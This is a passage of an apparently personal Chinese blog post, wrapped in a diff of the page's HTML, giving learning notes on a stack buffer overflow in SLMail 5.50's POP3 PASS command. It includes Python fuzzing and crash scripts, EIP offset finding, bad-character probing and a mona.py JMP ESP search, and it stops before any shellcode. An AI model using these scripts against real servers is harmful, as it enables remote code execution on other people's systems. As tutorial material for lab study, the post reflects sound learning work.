@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="FUZZER（window缓存区溢出）  SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead） ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0） mona.py（Github上下载）     window上看开启的服务 1.netstat -nao（cmd） 2.se">
+<meta name="keywords" content="安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali Linux笔记(二十七)：Window缓冲区溢出">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;11&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA&#x2F;index.html">
+<meta property="og:site_name" content="Tomas&#39;Blog">
+<meta property="og:description" content="FUZZER（window缓存区溢出）  SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead） ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0） mona.py（Github上下载）     window上看开启的服务 1.netstat -nao（cmd） 2.se">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-12-11T05:01:00.089Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/11/Kali Linux笔记(二十七)：Window缓冲区溢出/"/>
+
+
+
+
+
+  <title>Kali Linux笔记(二十七)：Window缓冲区溢出 | Tomas'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tomas'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(二十七)：Window缓冲区溢出</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-11T13:03:18+08:00">
+                2019-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<ol>
+<li><p>FUZZER（window缓存区溢出）</p>
+<ul>
+<li>SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead）</li>
+<li>ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0）</li>
+<li>mona.py（Github上下载）</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>window上看开启的服务
+1.netstat -nao（cmd）
+2.services.msc（允许win+R）</code></pre></blockquote>
+<blockquote>
+<pre><code>mona.py放在ImmunityDebugger中
+右键 → 查找目标 → PyCommonds → 拷贝mona.py</code></pre></blockquote>
+<ol start="2">
+<li><p>FUZZER</p>
+<ul>
+<li>SLMail 5.50 Mail Server（不同端口开的不同服务，都有不同指令可以向服务器提交数据）<ul>
+<li>POP3 PASS命令存在缓存区溢出漏洞（nc SMTP or POP3,shell code进行试探)</li>
+<li>无需身份验证实现远程代码执行</li>
+<li>DEP：阻止代码从数据页被执行（CPU特性，通过操作系统软硬件实现，可绕过DEP）</li>
+<li>ALSA：随机内存地址加载执行程序盒DDL，每次重启地址变化（动态内存地址分配，通过shell直接跳转到固定的内存地址，操作系统实现，在window vista之后加入）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>在Kali端，向右键服务器发送大量命令组合的字符串（如：USER;ls）
+在window xp端，用ImmunityDebugger查看在发送命令时是否会出现缓冲区溢出</code></pre></blockquote>
+<ol start="3">
+<li>POP3<ul>
+<li>nc IP地址 110端口</li>
+<li>了解未知协议<ul>
+<li>Wireshark（抓包分析学习）</li>
+<li>标准RFC（查询协议的参数，进行学习）</li>
+</ul>
+</li>
+<li>./01.py（测试是否能连接POP3服务器）</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&apos;IP地址&apos;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;USER yuanfh&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;PASS test\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>FUZZING</p>
+<ul>
+<li>测试PASS命令接收到大量数据是否会溢出（需要发送的数据大于缓冲区）</li>
+<li>EIP寄存器存放下一条指令的地址（首先关注EIP，ESP，EDP，可使指向shell code的地址）</li>
+<li>./02.py</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buffer=[&apos;A&apos;]</span><br><span class="line">counter=100</span><br><span class="line">while len(buffer)&lt;=50:</span><br><span class="line">    buffer.append(&quot;A&quot;*counter)</span><br><span class="line">    counter=counter+200</span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing PASS with %s bytes&quot;%len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect=s.connect((&apos;IP地址&apos;,110))</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos;+string+&apos;\r\n&apos;)</span><br><span class="line">    s.send(&apos;QUIT\r\n&apos;)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<pre><code>ImmunityDebugger调试（记录程序的运行状态，为中间数据的拦截、记录）：
+1.Open → 打开一个静态的exe文件
+2.Attack → 正在运行的程序（通过PID区attack，attack会使进程停止，需点击开始）</code></pre></blockquote>
+<ol start="5">
+<li><p>FUZZING</p>
+<ul>
+<li>2700个字符实现EIP寄存器溢出</li>
+<li>./03.py</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2700</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找到精确溢出的4个字节<ul>
+<li>二分法</li>
+<li>唯一字串法</li>
+<li>usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 2700</li>
+<li>./pattern_offset.rb EIP的4个十六进制数字（通过工具找到位置）</li>
+<li>./04.py</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&apos;</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找到精确溢出的4个字节<ul>
+<li>./05.py</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*20</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<pre><code>window系统为小端存储形式，低位高地址，高位低地址
+EIP为4个十六进制的数字，可通过ASCII换算成字符串
+ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码</code></pre></blockquote>
+<ol start="6">
+<li><p>FUZZING</p>
+<ul>
+<li>思路：<ul>
+<li>将EIP修改为Shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到Shellcode代码段并执行</li>
+</ul>
+</li>
+<li>寻找可存放Shellcode的内容空间</li>
+<li>./06.py（查看ESP寄存器可存放多少个字符）</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*(3500-2607-4)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+
+
+<ol start="7">
+<li><p>FUZZING</p>
+<ul>
+<li>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途<ul>
+<li>返回地址、Shellcode、buffer中都不能出现坏字符</li>
+<li>null byte（0x00）空字符，用于终止字符串拷贝的操作</li>
+<li>return（0x0D）回车操作，表示POP3 PASS命令输入完成</li>
+<li>思路：发送0x00–0xff 256个字符，查找所有的坏字符</li>
+<li>./07.py（查找坏字符）</li>
+<li>0x0A（导致后面数据无法出现）</li>
+<li>0x0D（被过滤）</li>
+<li>0x00（被过滤）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>字符传进寄存器，可能会被过滤，也可能使服务端carsh</code></pre></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=&#123;&#125;</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+badchars</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li><p>FUZZING</p>
+<ul>
+<li>重定向数据流<ul>
+<li>用ESP的地址替换EIP的值</li>
+<li>但是ESP地址变化，硬编码不可行（每次操作系统随机分配）</li>
+<li>SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围使不确定的</li>
+</ul>
+</li>
+<li>变通思路<ul>
+<li>在内存中寻找地址固定的系统模块</li>
+<li>在模块中寻找JMP ESP指定的地址跳转，再由该指令间接跳转到ESP，从而执行Shellcode</li>
+<li>mono.py脚本识别内存模块，搜索”return address”是JMP ESP指令的模块</li>
+<li>寻找无DEP、ALSR保护的内存地址</li>
+<li>内存地址不包含坏字符</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>FUZZING</p>
+<ul>
+<li>寻找不受保护的系统模块<ul>
+<li>!mona modules</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>Rebase：操作系统重启，内存地址是否发生变化，基地址变化，为False
+SafeSEH、ASLR：操作系统提供的内存保护机制，为False
+OS DLL：操作系统自带的动态链接库，为True</code></pre></blockquote>
+<ul>
+<li>将汇编指令JMP ESP转换为二进制<ul>
+<li>./nasm shell</li>
+<li>FFE4</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>msf脚本工具：
+/usr/share/metasploit-framwork/tools/nasm_shell rb（汇编语言转换为二进制）</code></pre></blockquote>
+<ul>
+<li>在模块中搜索FFE4指令<ul>
+<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m openc32.dll</li>
+<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m mfc42.dll</li>
+<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m slmfc.dll</li>
+<li>选择不包含坏字符的内存地址</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>切换汇编语言表示形式：Disassemble
+Memory Map内存地址图查看模块对应的基地址是否收到DEP,ALSR的保护，是否需要绕过
+▲绕过DEP的一种方法：Menmory Map中的对应的基址的Pocess需为（RE可读可执行）</code></pre></blockquote>
+<ul>
+<li>在该地址设置断点<ul>
+<li>设置断点：右键 → BreakPoint → Memory on acess</li>
+<li>Debug → Step info单步执行</li>
+</ul>
+</li>
+<li>重发buffer（小端存储 → 地址完全翻转）<ul>
+<li>./08.py（查看模块指令的地址是否为ESP的地址）</li>
+</ul>
+</li>
+</ul>
